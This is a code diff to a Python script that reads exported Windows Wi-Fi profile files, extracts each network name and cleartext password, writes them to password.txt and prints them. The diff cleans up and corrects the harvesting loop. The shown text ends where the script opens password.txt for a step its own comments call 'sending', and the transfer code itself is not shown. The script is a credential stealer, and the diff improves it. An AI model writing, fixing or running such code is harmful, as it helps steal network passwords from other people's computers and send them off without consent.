@@ -21,30 +21,27 @@ path = os.getcwd()
 
 #the scrapping and sending
 for filename in os.listdir(path):
-     if filename.startswith("Wi-Fi-"): #and filename.endswith(".xml")
-          wifi_files.append(filename)
-          for i in wifi_files:
-               with open (i, "r") as f:
-                    for line in f.readlines():
-                         if 'name' in line :
-                              stripped = line.strip()
-                              front = stripped[6:]
-                              back = front[:-7]
-                              print(back)
-                              wifi_names.append(back)
-                            #  wifi_names.append(front)
-
-                         if 'keyMaterial' in line:
-                              kstripped = line.strip()
-                              front = kstripped[13:] 
-                              back = front[:-14]
-                              print(back)
-                              wifi_passwords.append(back)
-                              for x,y in zip(wifi_names, wifi_passwords):
-                                   sys.stdout = open("password.txt", "a")
-                                   print("SSID: "+x, "password: "+y, sep='\n')
-                                   sys.stdout.close()
-
+    if filename.startswith("Wi-Fi-"): #and filename.endswith(".xml")
+        wifi_files.append(filename)
+        ssid = None
+        password = None
+        with open(filename, "r") as f:
+            for line in f:
+                if '<name>' in line:
+                    stripped = line.strip()
+                    front = stripped[6:]
+                    ssid = front[:-7]
+                if '<keyMaterial>' in line:
+                    kstripped = line.strip()
+                    front = kstripped[13:]
+                    password = front[:-14]
+        if ssid and password:
+            wifi_names.append(ssid)
+            wifi_passwords.append(password)
+            with open("password.txt", "a") as out:
+                print("SSID: " + ssid, "password: " + password, sep='\n', file=out)
+            print(ssid)
+            print(password)
 
 #sending 
 with open('password.txt', 'rb') as f:
